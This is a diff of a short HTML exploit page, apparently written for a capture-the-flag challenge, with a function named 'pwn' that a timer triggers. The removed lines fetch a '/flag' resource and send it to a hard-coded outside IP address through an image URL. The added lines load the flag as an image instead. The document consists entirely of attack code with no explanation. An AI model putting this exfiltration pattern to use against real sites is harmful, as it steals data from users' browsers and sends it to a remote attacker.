@@ -1,17 +1,16 @@
 <html>
 <head>
-<script src="jquery.min.js"></script> <!-- can't access maxcdn in China -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script type="text/javascript">
 
 function pwn() {
-    $.get('/flag', function(data) {
-        var image = new Image();
-        image.src='http://74.91.113.73:4321?data='+data;
-    });
+    var img = document.createElement('img');
+    img.src = "/flag";
+    document.body.appendChild(img);
 }
 
 function foo() {
-    setTimeout(pwn, 110 * 1000);
+    setTimeout(pwn, 30 * 1000);
 }
 
 </script>
